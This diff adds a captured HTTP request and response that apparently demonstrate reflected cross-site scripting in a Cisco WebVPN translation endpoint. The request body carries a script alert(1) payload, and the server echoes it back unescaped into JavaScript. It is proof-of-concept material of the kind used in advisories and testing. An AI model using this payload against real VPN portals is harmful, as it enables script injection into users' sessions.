@@ -1,0 +1,28 @@
+REQUEST:
+POST https://www.example.com/+CSCOT+/translation?textdomain=csd&amp;prefix=trans&amp;lang=en-us HTTP/1.1 
+Host: www.example.com 
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9) Gecko/2008052906 Firefox/3.0 (.NET CLR 3.5.30729) 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
+Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 
+Keep-Alive: 300 
+Connection: keep-alive 
+Referer: https://www.example.com/CACHE/sdesktop/install/start.htm 
+Content-Type: application/xml; charset=UTF-8 
+Cookie: webvpnLang=en-us; webvpnlogin=1
+Pragma: no-cache 
+Cache-Control: no-cache 
+Content-Length: 56
+
+Starting, please wait...&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
+
+RESPONSE:
+HTTP/1.1 200 OK 
+Server: Cisco AWARE 2.0 
+Content-Type: text/html; charset=UTF-8 
+Cache-Control: no-cache 
+Pragma: no-cache 
+Connection: Keep-Alive 
+Date: Mon, 16 Nov 2009 14:14:07 GMT
+Content-Length: 122
+
+trans[&quot;Starting, please wait...\&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;] = &quot;Starting, please wait...\&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;;
